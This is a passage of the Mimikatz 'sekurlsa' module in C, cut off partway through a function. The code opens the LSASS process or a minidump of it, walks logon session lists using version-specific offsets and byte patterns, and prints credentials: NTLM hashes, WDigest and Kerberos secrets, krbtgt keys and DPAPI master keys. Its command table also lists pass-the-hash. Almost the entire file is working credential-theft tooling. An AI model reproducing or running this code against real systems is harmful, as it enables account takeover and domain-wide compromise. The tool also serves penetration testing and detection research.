/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa.h"

const KUHL_M_C kuhl_m_c_sekurlsa[] = {
	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},

	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},

	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
#ifdef _M_X64
	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
#endif
	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
};

const KUHL_M kuhl_m_sekurlsa = {
	L"sekurlsa",	L"SekurLSA module",	L"Some commands to enumerate credentials...",
	ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa, kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kdcsvc_package = {L"kdc", NULL, FALSE, L"kdcsvc.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
	&kuhl_m_sekurlsa_msv_package,
	&kuhl_m_sekurlsa_tspkg_package,
	&kuhl_m_sekurlsa_wdigest_package,
	&kuhl_m_sekurlsa_livessp_package,
	&kuhl_m_sekurlsa_kerberos_package,
	&kuhl_m_sekurlsa_ssp_package,
	&kuhl_m_sekurlsa_dpapi_svc_package,
	&kuhl_m_sekurlsa_credman_package,
	&kuhl_m_sekurlsa_kdcsvc_package,
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_51), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_51, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_51, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
	{kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
#ifdef LSASS_DECRYPT
	{kuhl_m_sekurlsa_nt63_init,	kuhl_m_sekurlsa_nt63_clean,	kuhl_m_sekurlsa_nt63_acquireKeys,	&kuhl_m_sekurlsa_nt63_pLsaProtectMemory,&kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory},
#endif
};

const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
KUHL_M_SEKURLSA_CONTEXT cLsass = {NULL, {0, 0, 0}};
wchar_t * pMinidumpName = NULL;

VOID kuhl_m_sekurlsa_reset()
{
	HANDLE toClose;
	ULONG i;
	
	free(pMinidumpName);
	pMinidumpName = NULL;
	if(cLsass.hLsassMem)
	{
		switch(cLsass.hLsassMem->type)
		{
		case KULL_M_MEMORY_TYPE_PROCESS:
			toClose = cLsass.hLsassMem->pHandleProcess->hProcess;
			break;
		case KULL_M_MEMORY_TYPE_PROCESS_DMP:
			toClose = cLsass.hLsassMem->pHandleProcessDmp->hMinidump;
			break;
		default:
			;
		}
		cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
		CloseHandle(toClose);
	}
	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
		RtlZeroMemory(&lsassPackages[i]->Module, sizeof(KUHL_M_SEKURLSA_LIB));
}

NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
{
	kprintf(L"Switch to PROCESS\n");
	kuhl_m_sekurlsa_reset();
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
{
	kprintf(L"Switch to MINIDUMP : ");
	if(argc != 1)
		PRINT_ERROR(L"<minidumpfile.dmp> argument is missing\n");
	else
	{
		kuhl_m_sekurlsa_reset();
		pMinidumpName = _wcsdup(argv[0]);
		kprintf(L"\'%s\'\n", pMinidumpName);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_init()
{
	lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
	#ifdef LSASS_DECRYPT
		((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
	#else
		&lsassLocalHelpers[1]
	#endif
		;
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_clean()
{
	return lsassLocalHelper->cleanLocalLib();
}

NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(lsassPackages, ARRAYSIZE(lsassPackages));
}

NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	NTSTATUS status = STATUS_SUCCESS;
	KULL_M_MEMORY_TYPE Type;
	HANDLE hData = NULL;
	DWORD pid;
	PMINIDUMP_SYSTEM_INFO pInfos;
	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;

	if(!cLsass.hLsassMem)
	{
		status = STATUS_NOT_FOUND;
		if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
		{
			if(pMinidumpName)
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
				kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
				hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			}
			else
			{
				Type = KULL_M_MEMORY_TYPE_PROCESS;
				if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
					hData = OpenProcess(processRights, FALSE, pid);
				else PRINT_ERROR(L"LSASS process not found (?)\n");
			}

			if(hData && hData != INVALID_HANDLE_VALUE)
			{
				if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
				{
					if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
					{
						if(pInfos = (PMINIDUMP_SYSTEM_INFO) kull_m_minidump_stream(cLsass.hLsassMem->pHandleProcessDmp->hMinidump, SystemInfoStream))
						{
							cLsass.osContext.MajorVersion = pInfos->MajorVersion;
							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;

							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
						#ifdef _M_X64
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
						#elif defined _M_IX86
							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
						#endif
						}
						else
						{
							isError = TRUE;
							PRINT_ERROR(L"Minidump without SystemInfoStream (?)\n");
						}
					}
					else
					{
					#ifdef _M_IX86
						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
							PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
						else
					#endif
						{						
							cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
							cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
							cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
						}
					}
					
					if(!isError)
					{
						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);

						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
						{
							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
							if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
							{
								status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
								if(!NT_SUCCESS(status))
									PRINT_ERROR(L"Key import\n");
							}
							else PRINT_ERROR(L"Logon list\n");
						}
						else PRINT_ERROR(L"Modules informations\n");
					}
				}
				else PRINT_ERROR(L"Memory opening\n");
			}
			else PRINT_ERROR_AUTO(L"Handle on memory");

			if(!NT_SUCCESS(status))
			{
				cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
				CloseHandle(hData);
			}
		}
		else PRINT_ERROR(L"Local LSA library failed\n");
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	ULONG i;
	for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
	{
		if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
		{
			lsassPackages[i]->Module.isPresent = TRUE;
			lsassPackages[i]->Module.Informations = *pModuleInformation;
		}
	}
	return TRUE;
}

NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
{
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	ULONG nbListes = 1, i;
	PVOID pStruct;
	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	BOOL retCallback = TRUE;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();

	if(NT_SUCCESS(status))
	{
		sessionData.cLsass = &cLsass;
		sessionData.lsassLocalHelper = lsassLocalHelper;

		if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
			helper = &lsassEnumHelpers[0];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
			helper = &lsassEnumHelpers[1];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
			helper = &lsassEnumHelpers[2];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
			helper = &lsassEnumHelpers[3];
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
			helper = &lsassEnumHelpers[5];
		else
			helper = &lsassEnumHelpers[6];

		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
			helper++; // yeah, really, I do that =)

		securityStruct.hMemory = cLsass.hLsassMem;
		if(securityStruct.address = LogonSessionListCount)
			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));

		for(i = 0; i < nbListes; i++)
		{
			securityStruct.address = &LogonSessionList[i];
			data.address = &pStruct;
			data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
			{
				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
				{
					data.address = pStruct;
					data.hMemory = securityStruct.hMemory;

					while((data.address != securityStruct.address) && retCallback)
					{
						if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
						{
							sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper->offsetToLuid);
							sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToLogonType));
							sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToSession));
							sessionData.UserName	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
							sessionData.LogonDomain	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
							sessionData.pCredentials= *(PVOID *)		((PBYTE) aBuffer.address + helper->offsetToCredentials);
							sessionData.pSid		= *(PSID *)			((PBYTE) aBuffer.address + helper->offsetToPSid);
							sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
							sessionData.LogonTime	= *((PFILETIME)		((PBYTE) aBuffer.address + helper->offsetToLogonTime));
							sessionData.LogonServer	= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);

							kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
							kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
							kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
							kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);

							retCallback = callback(&sessionData, pOptionalData);

							if(sessionData.UserName->Buffer)
								LocalFree(sessionData.UserName->Buffer);
							if(sessionData.LogonDomain->Buffer)
								LocalFree(sessionData.LogonDomain->Buffer);
							if(sessionData.LogonServer->Buffer)
								LocalFree(sessionData.LogonServer->Buffer);
							if(sessionData.pSid)
								LocalFree(sessionData.pSid);

							data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
						}
						else break;
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	return status;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
	ULONG i;
	//PDWORD sub = NULL;
	if((pData->LogonType != Network)/* && pData->LogonType != UndefinedLogonType*/)
	{
		//if(IsValidSid(pData->pSid) && GetSidSubAuthorityCount(pData->pSid))
		//	sub = GetSidSubAuthority(pData->pSid, 0);

		//if(!sub || (*sub != 90 && *sub != 96))
		//{
			kuhl_m_sekurlsa_printinfos_logonData(pData);
			for(i = 0; i < pLsassData->nbPackages; i++)
			{
				if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
				{
					kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
					pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
					kprintf(L"\n");
				}
			}
		//}
	}
	return TRUE;
}

const wchar_t * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	L"UndefinedLogonType",
	L"Unknown !",
	L"Interactive",
	L"Network",
	L"Batch",
	L"Service",
	L"Proxy",
	L"Unlock",
	L"NetworkCleartext",
	L"NewCredentials",
	L"RemoteInteractive",
	L"CachedInteractive",
	L"CachedRemoteInteractive",
	L"CachedUnlock",
};
void kuhl_m_sekurlsa_printinfos_logonData(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	kprintf(L"\nAuthentication Id : %u ; %u (%08x:%08x)\n"
		L"Session           : %s from %u\n"
		L"User Name         : %wZ\n"
		L"Domain            : %wZ\n"
		L"Logon Server      : %wZ\n"
		, pData->LogonId->HighPart, pData->LogonId->LowPart, pData->LogonId->HighPart, pData->LogonId->LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[pData->LogonType], pData->Session, pData->UserName, pData->LogonDomain, pData->LogonServer);

	kprintf(L"Logon Time        : ");
	kull_m_string_displayLocalFileTime(&pData->LogonTime);
	kprintf(L"\n");

	kprintf(L"SID               : ");
	if(pData->pSid)
		kull_m_string_displaySID(pData->pSid);
	kprintf(L"\n");
}

NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages)
{
	KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
}

#ifdef _M_X64
BYTE PTRN_W2K3_SecData[]	= {0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d};
BYTE PTRN_W2K8_SecData[]	= {0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d};
BYTE PTRN_W2K12_SecData[]	= {0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15};
BYTE PTRN_W2K12R2_SecData[]	= {0x0f, 0xb6, 0x4c, 0x24, 0x30, 0x85, 0xc0, 0x0f, 0x45, 0xcf, 0x8a, 0xc1};
KULL_M_PATCH_GENERIC SecDataReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 37}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
};
#elif defined _M_IX86
BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
BYTE PTRN_W2K8_SecData[]	= {0x8b, 0x45, 0x14, 0x83, 0xc0, 0x18, 0x50, 0xb9};
KULL_M_PATCH_GENERIC SecDataReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_SecData),		PTRN_W2K3_SecData},		{0, NULL}, {  7, 45}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, {  8, 47}},
};
#endif
NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
{
	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
	LONG l = 0;
	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};
	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {&dualKrbtgt, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(NT_SUCCESS(status))
	{
		if(kuhl_m_sekurlsa_kdcsvc_package.Module.isPresent)
		{
			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &kuhl_m_sekurlsa_kdcsvc_package.Module, SecDataReferences, ARRAYSIZE(SecDataReferences), &aLsass.address, NULL, NULL, &l))
			{
				aLsass.address = (PBYTE) aLsass.address + sizeof(PVOID) * l;
				if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(DUAL_KRBTGT)))
				{
					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, L"Current");
					kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, L"Previous");
				}
			}
			else PRINT_ERROR(L"Unable to find KDC pattern in LSASS memory\n");
		}
		else PRINT_ERROR(L"KDC service not in LSASS memory\n");
	}
	return status;
}

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(addr)
	{
		kprintf(L"\n%s krbtgt: ", prefix);
		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
		{
			aLocal.address = &tmpCred5;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_5) + (tmpCred5.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_5);
				if(creds5 = (PKIWI_KRBTGT_CREDENTIALS_5) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds5;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds5->cbCred);
						for(i = 0; i < creds5->cbCred; i++)
						{
							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds5->credentials[i].type)));
							aLsass.address = creds5->credentials[i].key;
							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds5->credentials[i].size)))
							{
								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds5->credentials[i].size)))
									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds5->credentials[i].size), 0);
								LocalFree(aLocal.address);
							}
							kprintf(L"\n");
						}
					}
					LocalFree(creds5);
				}
			}
		}
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			aLocal.address = &tmpCred6;
			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
					aLocal.address = creds6;
					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
					{
						kprintf(L"%u credentials\n", creds6->cbCred);
						for(i = 0; i < creds6->cbCred; i++)
						{
